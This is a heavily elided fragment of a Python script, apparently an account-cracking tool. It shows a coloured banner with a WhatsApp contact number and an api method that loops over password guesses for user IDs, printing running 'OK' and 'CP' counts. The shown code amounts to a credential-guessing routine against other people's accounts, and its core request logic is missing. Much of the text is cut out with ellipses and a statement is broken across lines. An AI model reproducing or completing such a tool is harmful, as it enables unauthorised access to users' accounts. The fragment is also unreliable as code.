...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     ...
     \033[1;93m➣ \033[1;92mWHATSAPP   :            01794315166
...
#				exit()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write("\r %s\033[0;93m[>_] [MAHADI] : \033[0;97m %s/%s -> \033[0;92m [MAHADI -OK:%s ]- \033[0;93m[MAHADI-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
